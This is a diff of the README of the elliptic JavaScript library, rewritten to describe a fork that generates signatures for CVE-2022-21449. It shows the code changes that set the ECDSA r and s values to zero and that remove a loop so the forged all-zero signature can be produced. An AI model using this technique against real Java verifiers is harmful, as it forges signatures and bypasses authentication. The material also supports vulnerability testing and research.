@@ -1,44 +1,20 @@
-# Elliptic [![Build Status](https://secure.travis-ci.org/indutny/elliptic.png)](http://travis-ci.org/indutny/elliptic) [![Coverage Status](https://coveralls.io/repos/indutny/elliptic/badge.svg?branch=master&service=github)](https://coveralls.io/github/indutny/elliptic?branch=master) [![Code Climate](https://codeclimate.com/github/indutny/elliptic/badges/gpa.svg)](https://codeclimate.com/github/indutny/elliptic)
+# Elliptic 
 
-[![Saucelabs Test Status](https://saucelabs.com/browser-matrix/gh-indutny-elliptic.svg)](https://saucelabs.com/u/gh-indutny-elliptic)
+## Fork of indutny/elliptic to generate a signature for CVE-2022-21449
 
-Fast elliptic-curve cryptography in a plain javascript implementation.
+modified only `lib/elliptic/ec/signature.js`
 
-NOTE: Please take a look at http://safecurves.cr.yp.to/ before choosing a curve
-for your cryptography operations.
+set r and s to 0 on lines 16-17
+```javascript
+16|  this.r = new BN(0);
+17|  this.s = new BN(0);
+```
 
-## Incentive
-
-ECC is much slower than regular RSA cryptography, the JS implementations are
-even more slower.
-
-## Benchmarks
-
-```bash
-$ node benchmarks/index.js
-Benchmarking: sign
-elliptic#sign x 262 ops/sec ±0.51% (177 runs sampled)
-eccjs#sign x 55.91 ops/sec ±0.90% (144 runs sampled)
-------------------------
-Fastest is elliptic#sign
-========================
-Benchmarking: verify
-elliptic#verify x 113 ops/sec ±0.50% (166 runs sampled)
-eccjs#verify x 48.56 ops/sec ±0.36% (125 runs sampled)
-------------------------
-Fastest is elliptic#verify
-========================
-Benchmarking: gen
-elliptic#gen x 294 ops/sec ±0.43% (176 runs sampled)
-eccjs#gen x 62.25 ops/sec ±0.63% (129 runs sampled)
-------------------------
-Fastest is elliptic#gen
-========================
-Benchmarking: ecdh
-elliptic#ecdh x 136 ops/sec ±0.85% (156 runs sampled)
-------------------------
-Fastest is elliptic#ecdh
-========================
+removed while loop to prevent indefinite loop on lines 153-155
+```javascript
+153|  while (!s[0] && !(s[1] & 0x80)) {
+154|    s = s.slice(1);
+155|  }
 ```
 
 ## API
